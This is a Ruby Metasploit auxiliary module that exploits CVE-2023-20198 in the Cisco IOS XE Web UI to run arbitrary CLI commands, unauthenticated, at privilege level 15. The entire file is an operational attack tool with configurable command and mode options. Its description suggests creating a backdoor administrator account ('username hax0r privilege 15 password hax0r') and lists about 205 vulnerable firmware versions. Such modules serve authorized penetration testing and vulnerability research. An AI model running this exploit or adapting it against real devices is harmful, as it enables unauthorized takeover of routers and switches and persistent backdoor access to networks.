##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HTTP::CiscoIosXe
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Cisco IOX XE unauthenticated Command Line Interface (CLI) execution',
        'Description' => %q{
          This module leverages CVE-2023-20198 against vulnerable instances of Cisco IOS XE devices which have the
          Web UI exposed. An attacker can execute arbitrary CLI commands with privilege level 15.

          You must specify the IOS command mode to execute a CLI command in. Valid modes are `user`, `privileged`, and
          `global`. To run a command in "Privileged" mode, set the `CMD` option to the command you want to run,
          e.g. `show version` and set the `MODE` to `privileged`.  To run a command in "Global Configuration" mode, set
          the `CMD` option to the command you want to run,  e.g. `username hax0r privilege 15 password hax0r` and set
          the `MODE` to `global`.

          The vulnerable IOS XE versions are:
          16.1.1, 16.1.2, 16.1.3, 16.2.1, 16.2.2, 16.3.1, 16.3.2, 16.3.3, 16.3.1a, 16.3.4,
          16.3.5, 16.3.5b, 16.3.6, 16.3.7, 16.3.8, 16.3.9, 16.3.10, 16.3.11, 16.4.1, 16.4.2,
          16.4.3, 16.5.1, 16.5.1a, 16.5.1b, 16.5.2, 16.5.3, 16.6.1, 16.6.2, 16.6.3, 16.6.4,
          16.6.5, 16.6.4s, 16.6.4a, 16.6.5a, 16.6.6, 16.6.5b, 16.6.7, 16.6.7a, 16.6.8, 16.6.9,
          16.6.10, 16.7.1, 16.7.1a, 16.7.1b, 16.7.2, 16.7.3, 16.7.4, 16.8.1, 16.8.1a, 16.8.1b,
          16.8.1s, 16.8.1c, 16.8.1d, 16.8.2, 16.8.1e, 16.8.3, 16.9.1, 16.9.2, 16.9.1a, 16.9.1b,
          16.9.1s, 16.9.1c, 16.9.1d, 16.9.3, 16.9.2a, 16.9.2s, 16.9.3h, 16.9.4, 16.9.3s, 16.9.3a,
          16.9.4c, 16.9.5, 16.9.5f, 16.9.6, 16.9.7, 16.9.8, 16.9.8a, 16.9.8b, 16.9.8c, 16.10.1,
          16.10.1a, 16.10.1b, 16.10.1s, 16.10.1c, 16.10.1e, 16.10.1d, 16.10.2, 16.10.1f, 16.10.1g,
          16.10.3, 16.11.1, 16.11.1a, 16.11.1b, 16.11.2, 16.11.1s, 16.11.1c, 16.12.1, 16.12.1s,
          16.12.1a, 16.12.1c, 16.12.1w, 16.12.2, 16.12.1y, 16.12.2a, 16.12.3, 16.12.8, 16.12.2s,
          16.12.1x, 16.12.1t, 16.12.2t, 16.12.4, 16.12.3s, 16.12.1z, 16.12.3a, 16.12.4a, 16.12.5,
          16.12.6, 16.12.1z1, 16.12.5a, 16.12.5b, 16.12.1z2, 16.12.6a, 16.12.7, 16.12.9, 16.12.10,
          17.1.1, 17.1.1a, 17.1.1s, 17.1.2, 17.1.1t, 17.1.3, 17.2.1, 17.2.1r, 17.2.1a, 17.2.1v,
          17.2.2, 17.2.3, 17.3.1, 17.3.2, 17.3.3, 17.3.1a, 17.3.1w, 17.3.2a, 17.3.1x, 17.3.1z,
          17.3.3a, 17.3.4, 17.3.5, 17.3.4a, 17.3.6, 17.3.4b, 17.3.4c, 17.3.5a, 17.3.5b, 17.3.7,
          17.3.8, 17.4.1, 17.4.2, 17.4.1a, 17.4.1b, 17.4.1c, 17.4.2a, 17.5.1, 17.5.1a, 17.5.1b,
          17.5.1c, 17.6.1, 17.6.2, 17.6.1w, 17.6.1a, 17.6.1x, 17.6.3, 17.6.1y, 17.6.1z, 17.6.3a,
          17.6.4, 17.6.1z1, 17.6.5, 17.6.6, 17.7.1, 17.7.1a, 17.7.1b, 17.7.2, 17.10.1, 17.10.1a,
          17.10.1b, 17.8.1, 17.8.1a, 17.9.1, 17.9.1w, 17.9.2, 17.9.1a, 17.9.1x, 17.9.1y, 17.9.3,
          17.9.2a, 17.9.1x1, 17.9.3a, 17.9.4, 17.9.1y1, 17.11.1, 17.11.1a, 17.12.1, 17.12.1a,
          17.11.99SW
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'sfewer-r7', # MSF module
        ],
        'References' => [
          ['CVE', '2023-20198'],
          # Vendor advisories.
          ['URL', 'https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-iosxe-webui-privesc-j22SaA4z'],
          ['URL', 'https://blog.talosintelligence.com/active-exploitation-of-cisco-ios-xe-software/'],
          # Vendor list of (205) vulnerable versions.
          ['URL', 'https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-iosxe-webui-privesc-j22SaA4z/cvrf/cisco-sa-iosxe-webui-privesc-j22SaA4z_cvrf.xml'],
          # Technical details on CVE-2023-20198.
          ['URL', 'https://www.horizon3.ai/cisco-ios-xe-cve-2023-20198-theory-crafting/'],
          ['URL', 'https://www.horizon3.ai/cisco-ios-xe-cve-2023-20198-deep-dive-and-poc/']
        ],
        'DisclosureDate' => '2023-10-16',
        'DefaultOptions' => {
          'RPORT' => 443,
          'SSL' => true
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options(
      [
        OptString.new('CMD', [ true, 'The CLI command to execute.', 'show version']),
        OptString.new('MODE', [ true, "The mode to execute the CLI command in, valid values are 'user', 'privileged', or 'global'.", Mode::PRIVILEGED_EXEC])
      ]
    )
  end

  def run
    # We convert escaped newlines into actual newlines, as the Cisco CLI will allow you to navigate from an upper mode
    # (e.g. Global) down to a lower mode (e.g. Privileged or User) via the "exit" command. We explicitly let a user
    # specify the mode to execute their CMD in, via the MODE option, however we must still support the user specifying
    # newlines as they may want to execute multiple commands (or manually navigate the difference modes).
    cmd = datastore['CMD'].gsub('\\n', "\n")
    if cmd.empty?
      print_error('Command can not be empty.')
      return
    end

    mode = Mode.to_mode(datastore['MODE'].to_s.downcase)
    if mode.nil?
      print_error("Invalid mode specified, valid values are 'user', 'privileged', or 'global'")
      return
    end

    result = run_cli_command(cmd, mode)
    if result.nil?
      print_error('Failed to run the command.')
      return
    end

    print_line(result)
  end

end
